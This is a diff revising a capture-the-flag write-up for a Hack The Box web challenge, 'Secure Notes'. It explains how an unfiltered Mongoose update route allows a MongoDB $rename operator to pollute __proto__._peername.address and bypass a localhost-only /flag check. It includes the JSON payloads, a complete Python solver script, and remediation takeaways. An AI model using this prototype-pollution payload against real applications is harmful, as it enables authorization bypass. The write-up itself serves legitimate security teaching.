@@ -19,31 +19,31 @@ featured: true
 
 ## Challenge Description
 
-Secure Notes is a small Node.js note-taking application. From the player perspective, the app lets us create notes, view them, and update their title and content through a simple web UI.
+Secure Notes is a small Node.js note-taking application. The application lets users create notes, view them, and update their title and content through a simple web interface.
 
-The challenge bundle contains an Express application backed by MongoDB through Mongoose. The important files are `app.js`, which defines the API routes, `package.json`, which shows the Express and Mongoose dependencies, and the Docker configuration that runs both the app and `mongod` under supervisor.
+From the source code, the backend is built with Express and uses MongoDB through Mongoose. At first glance, the application looks straightforward: there is a route to create notes, another one to update them, and a protected `/flag` route that only responds when the request appears to come from localhost.
 
-There is also a top-level `exploit.py`, which is the useful solver for the challenge. A second solver exists under `web_secure_notes/exploit.py`, but it appears to be a partial or stale attempt and does not retrieve the flag.
+The interesting part is how the application handles note updates. The update route passes user-controlled JSON directly into a Mongoose update call, which allows us to inject MongoDB update operators.
 
 ## TL;DR
 
 1. `/flag` only returns the flag when `req.connection.remoteAddress` is localhost.
 2. `/create` lets us create a note with attacker-controlled `title` and `content`.
 3. `/update` passes the full request body directly into `Note.findByIdAndUpdate()`.
-4. Because update operators are not filtered, we can send a raw MongoDB `$rename`.
-5. `$rename` moves `title` into `__proto__._peername.address`, causing prototype pollution.
-6. After pollution, `/flag` reads the forged peer address and returns the flag.
+4. Since update operators are not filtered, we can inject a raw MongoDB `$rename` operator.
+5. `$rename` moves the `title` value into `__proto__._peername.address`, causing prototype pollution.
+6. After the pollution, `/flag` reads the forged peer address and returns the flag.
 
 ## Initial Analysis
 
-The backend is very small. It connects to MongoDB, defines a `Note` model, serves static files, and exposes four routes:
+The backend is very small. It connects to MongoDB, defines a `Note` model, serves static files, and exposes a few routes:
 
 ```js
 app.get('/flag', ...);
 app.post('/create', ...);
 app.get('/get/:noteId', ...);
 app.post('/update', ...);
-```
+````
 
 The note schema only contains two fields:
 
@@ -54,13 +54,15 @@ const Note = mongoose.model('Note', new mongoose.Schema({
 }));
 ```
 
-The flag route immediately stands out because it uses the request's socket address as an authorization boundary. Remote users should receive `403`, while local requests receive the flag.
+The `/flag` route immediately looks interesting because it uses the request socket address as an authorization check. If the request comes from localhost, the route returns the flag. Otherwise, it returns `403`.
 
-There is no SSRF primitive in the application, so the interesting question becomes: can we influence what Express or Node thinks the client address is?
+There is no obvious SSRF feature in the application, so the question becomes:
 
-## Reading The Source
+> Can we somehow influence what Node thinks the client address is?
 
-The flag route checks `req.connection.remoteAddress`:
+## Reading the Source
+
+The `/flag` route checks `req.connection.remoteAddress`:
 
 ```js
 app.get('/flag', (req, res) => {
@@ -73,7 +75,7 @@ app.get('/flag', (req, res) => {
 });
 ```
 
-The create route is mostly normal. It validates that both fields are strings, then stores the note:
+The `/create` route validates that both `title` and `content` are strings before saving the note:
 
 ```js
 app.post('/create', async (req, res) => {
@@ -93,6 +95,8 @@ app.post('/create', async (req, res) => {
 });
 ```
 
+So far, nothing too suspicious.
+
 The vulnerable route is `/update`:
 
 ```js
@@ -109,7 +113,7 @@ app.post('/update', async (req, res) => {
 });
 ```
 
-The application expects the body to look like this:
+The intended request body probably looks like this:
 
 ```json
 {
@@ -119,15 +123,15 @@ The application expects the body to look like this:
 }
 ```
 
-But it never enforces that shape. Whatever JSON keys we send are handed directly to Mongoose as the update document.
+However, the application never restricts the update body to only `title` and `content`. Whatever JSON we send is passed directly to `findByIdAndUpdate()`.
 
 ## Vulnerability Analysis
 
-The core bug is trusting the client-controlled update body.
+The bug is caused by passing the entire request body directly into a MongoDB update operation.
 
-The application assumes that users will only send ordinary fields such as `title` and `content`. That assumption is wrong because MongoDB update documents can contain operators like `$set`, `$unset`, and `$rename`.
+MongoDB update objects are not always plain data. They can also contain update operators such as `$set`, `$unset`, and `$rename`.
 
-The vulnerable data flow is:
+The vulnerable data flow looks like this:
 
 ```text
 HTTP JSON body
@@ -137,7 +141,7 @@ HTTP JSON body
   -> MongoDB/Mongoose update operation
 ```
 
-Because `req.body` is used directly as the update object, an attacker can inject a MongoDB operator. The solver uses `$rename`:
+Because the user controls the update object, we can inject the `$rename` operator:
 
 ```json
 {
@@ -148,31 +152,31 @@ Because `req.body` is used directly as the update object, an attacker can inject
 }
 ```
 
-Before sending this update, the attacker creates a note with this title:
+Before sending that update, we create a note with this title:
 
 ```text
 127.0.0.1
 ```
 
-The `$rename` operation then moves that value into the dangerous path:
+Then the `$rename` operation moves the `title` value into this path:
 
 ```text
 __proto__._peername.address = "127.0.0.1"
 ```
 
-In this Node.js environment, `req.connection.remoteAddress` depends on the socket peer-name information. By polluting `_peername.address`, the later `/flag` request sees a forged localhost address and passes the authorization check.
+This pollutes the prototype path used by the socket peer-name information. After that, when `/flag` checks `req.connection.remoteAddress`, it resolves to the polluted localhost value.
 
-The bypass is not about reaching the server from localhost. It is about corrupting the object state used by the localhost check.
+So the bypass is not about actually making a request from localhost. Instead, we corrupt the object state that the localhost check depends on.
 
-## First Attempts
+## Failed Attempts
 
-The obvious first request is to hit `/flag` directly:
+The first obvious test is requesting `/flag` directly:
 
 ```http
 GET /flag
 ```
 
-That fails with `403` because the remote address is not one of the accepted loopback values.
+This fails with `403`, because our real remote address is not localhost.
 
 A normal note update also does not help:
 
@@ -184,15 +188,15 @@ A normal note update also does not help:
 }
 ```
 
-That only changes stored note fields. The server-side `remoteAddress` value is still controlled by Node's socket internals, not by the note content.
+This only changes the stored note fields. It does not affect the socket address used by the `/flag` route.
 
-The important realization is that `/update` is not limited to normal fields. Once raw MongoDB operators are allowed, the note update route becomes a way to reach dangerous object paths.
+The important realization is that `/update` is not limited to normal fields. Since raw MongoDB operators are allowed, we can use the update route to write into dangerous object paths.
 
 ## Exploitation
 
-The final exploit has three requests.
+The exploit only needs three steps.
 
-First, create a note whose `title` contains the address we want `/flag` to see:
+First, create a note whose `title` contains the address we want the server to see:
 
 ```json
 {
@@ -203,7 +207,7 @@ First, create a note whose `title` contains the address we want `/flag` to see:
 
 The server returns the created note, including its `_id`.
 
-Next, update that note using a raw `$rename` operator:
+Next, send a malicious update using `$rename`:
 
 ```json
 {
@@ -214,7 +218,7 @@ Next, update that note using a raw `$rename` operator:
 }
 ```
 
-This poisons the peer-name address used later by the socket address lookup.
+This renames the `title` field into a prototype pollution path.
 
 Finally, request the protected route:
 
@@ -222,7 +226,7 @@ Finally, request the protected route:
 GET /flag
 ```
 
-After the pollution step, the localhost check succeeds and the app returns the flag.
+After the pollution step, the localhost check succeeds and the application returns the flag.
 
 ## Exploit Flow Summary
 
@@ -230,49 +234,57 @@ After the pollution step, the localhost check succeeds and the app returns the f
 create note with title = 127.0.0.1
   -> send unfiltered $rename through /update
   -> rename title into __proto__._peername.address
-  -> req.connection.remoteAddress resolves to polluted value
+  -> req.connection.remoteAddress resolves to the polluted value
   -> /flag localhost check passes
-  -> final flag
+  -> flag is returned
 ```
 
 ## Solver
-
-A cleaned-up version of the working solver is:
 
 ```python
 #!/usr/bin/env python3
 import sys
 import requests
 
-target = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:1337"
 
-# Store the value that we want Node to later read as the socket peer address.
-note = requests.post(f"{target}/create", json={
-    "title": "127.0.0.1",
-    "content": "pwned"
-}).json()
+def main():
+    target = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:1337"
 
-note_id = note["_id"]
+    session = requests.Session()
 
-# Inject a raw MongoDB update operator.
-# The title value is renamed into a prototype path used by Node's peer-name lookup.
-requests.post(f"{target}/update", json={
-    "noteId": note_id,
-    "$rename": {
-        "title": "__proto__._peername.address"
-    }
-})
+    note = session.post(f"{target}/create", json={
+        "title": "127.0.0.1",
+        "content": "pwned"
+    })
+    note.raise_for_status()
 
-print(requests.get(f"{target}/flag").text)
+    note_id = note.json()["_id"]
+
+    pollution = session.post(f"{target}/update", json={
+        "noteId": note_id,
+        "$rename": {
+            "title": "__proto__._peername.address"
+        }
+    })
+    pollution.raise_for_status()
+
+    flag = session.get(f"{target}/flag")
+    flag.raise_for_status()
+
+    print(flag.text)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 Run it like this:
 
 ```bash
-python3 exploit.py http://127.0.0.1:1337
+python3 solve.py http://127.0.0.1:1337
 ```
 
-For a remote HTB instance, replace the URL with the provided host and port.
+For the remote instance, replace the URL with the provided Hack The Box host and port.
 
 ## Flag
 
@@ -282,17 +294,17 @@ HTB{redacted}
 
 ## Why This Bug Matters
 
-This challenge is a good example of why database update APIs should not receive client JSON directly.
+This challenge is a good example of why user-controlled JSON should not be passed directly into database update APIs.
 
-With Mongoose and MongoDB, an update object is not just data. It can also be an instruction document containing operators. If the application does not explicitly select allowed fields, user input can become database logic.
+In MongoDB, an update object can contain operators, not only normal fields. If the application does not explicitly allowlist the fields that can be updated, user input can become database logic.
 
-The localhost check is also fragile. Authorization based on `remoteAddress` assumes the runtime state is trustworthy. Once prototype pollution enters the picture, even internal-looking properties can become attacker-influenced.
+The localhost check is also fragile. Authorization based only on `remoteAddress` assumes that the runtime state is trustworthy. Once prototype pollution is possible, even internal-looking properties can become attacker-controlled.
 
 ## Takeaways
 
-- Never pass an entire request body directly into a MongoDB update call.
-- Allowlist updateable fields such as `title` and `content`.
-- Reject keys starting with `$` in user-controlled objects unless they are explicitly needed.
-- Treat paths containing `__proto__`, `constructor`, or `prototype` as dangerous.
-- Localhost-only checks are not a substitute for real authorization.
-- Prototype pollution can turn small data bugs into control over framework or runtime behavior.
+* Never pass an entire request body directly into a MongoDB update call.
+* Allowlist updateable fields such as `title` and `content`.
+* Reject keys starting with `$` in user-controlled objects unless explicitly required.
+* Treat paths containing `__proto__`, `constructor`, or `prototype` as dangerous.
+* Do not use localhost-only checks as a replacement for real authorization.
+* Prototype pollution can turn a small update bug into control over runtime behavior.
